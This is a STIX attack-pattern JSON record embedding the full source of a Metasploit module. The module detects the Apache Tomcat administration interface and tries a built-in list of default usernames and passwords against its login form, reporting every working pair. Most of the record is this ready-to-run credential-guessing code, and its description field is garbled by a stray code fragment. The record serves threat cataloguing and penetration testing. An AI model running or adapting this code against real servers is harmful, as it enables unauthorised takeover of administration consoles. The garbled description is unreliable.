{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bd578e3d-24c0-4e90-8205-18b2f6a7e93c",
    "created": "2024-08-14T16:23:13.307201Z",
    "modified": "2024-08-14T16:23:13.307206Z",
    "name": "Tomcat Administration Tool Default Access",
    "description": "Detect the Tomcat administration interface.  The administration interface is included in versions 5.5 and lower. Port 8180 is the default for FreeBSD, 8080 for all others.' # version of admin interface source: O'Reilly Tomcat The Definitive Guide, page 82 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/tomcat_administration.rb",
            "external_id": "tomcat_administration.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanServer\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'Tomcat Administration Tool Default Access',\n      'Description' => 'Detect the Tomcat administration interface.  The administration interface is included in versions 5.5 and lower.\n                        Port 8180 is the default for FreeBSD, 8080 for all others.',\n      # version of admin interface source: O'Reilly Tomcat The Definitive Guide, page 82\n      'References' => [\n        ['URL', 'http://tomcat.apache.org/'],\n      ],\n      'Author' => 'Matteo Cantoni <goony[at]nothink.org>',\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8180), # 8180 is default for FreeBSD.  All other OSes it's 8080\n        OptString.new('TOMCAT_USER', [ false, 'The username to authenticate as', '']),\n        OptString.new('TOMCAT_PASS', [ false, 'The password for the specified username', '']),\n      ]\n    )\n  end\n\n  def post_auth?\n    true\n  end\n\n  def run_host(_ip)\n    res = send_request_raw(\n      {\n        'method' => 'GET',\n        'uri' => '/'\n      }, 25\n    )\n\n    http_fingerprint({ response: res })\n\n    if (res && (res.code == 200))\n\n      ver = ''\n\n      if res.body.match(%r{<title>Apache Tomcat/(.*)</title>})\n        ver = 'Apache Tomcat/' + ::Regexp.last_match(1)\n      end\n\n      user = datastore['TOMCAT_USER'].to_s\n      pass = datastore['TOMCAT_PASS'].to_s\n\n      if user.empty?\n        default_usernames = ['admin', 'manager', 'role1', 'root', 'tomcat']\n      else\n        default_usernames = [user]\n      end\n\n      if pass.empty?\n        default_passwords = ['admin', 'manager', 'role1', 'root', 'tomcat']\n      else\n        default_passwords = [pass]\n      end\n\n      default_usernames.each do |username|\n        default_passwords.each do |password|\n          res = send_request_raw({\n            'method' => 'GET',\n            'uri' => '/admin/'\n          }, 25)\n\n          next unless res && res.code == 200 && res.get_cookies.match(/JSESSIONID=(.*);(.*)/i)\n\n          jsessionid = ::Regexp.last_match(1)\n\n          post_data = \"j_username=#{username}&j_password=#{password}\"\n\n          res = send_request_cgi({\n            'uri' => '/admin/j_security_check',\n            'method' => 'POST',\n            'content-type' => 'application/x-www-form-urlencoded',\n            'cookie' => \"JSESSIONID=#{jsessionid}\",\n            'data' => post_data\n          }, 25)\n\n          next unless (res && (res.code == 302))\n\n          res = send_request_cgi({\n            'uri' => '/admin/',\n            'method' => 'GET',\n            'cookie' => \"JSESSIONID=#{jsessionid}\"\n          }, 25)\n\n          next unless (res && (res.code == 302))\n\n          res = send_request_cgi({\n            'uri' => '/admin/frameset.jsp',\n            'method' => 'GET',\n            'cookie' => \"JSESSIONID=#{jsessionid}\"\n          }, 25)\n\n          if (res && (res.code == 200))\n            print_status(\"http://#{target_host}:#{rport}/admin [#{res.headers['Server']}] [#{ver}] [Tomcat Server Administration] [#{username}/#{password}]\")\n          end\n\n          # LogOut\n          res = send_request_cgi({\n            'uri' => '/admin/logOut.do',\n            'method' => 'GET',\n            'cookie' => \"JSESSIONID=#{jsessionid}\"\n          }, 25)\n        end\n      end\n    end\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n  rescue ::Timeout::Error, ::Errno::EPIPE\n  end\nend\n",
    "x_mitre_contributors": [
        "Matteo Cantoni <goony[at]nothink.org>",
        ""
    ]
}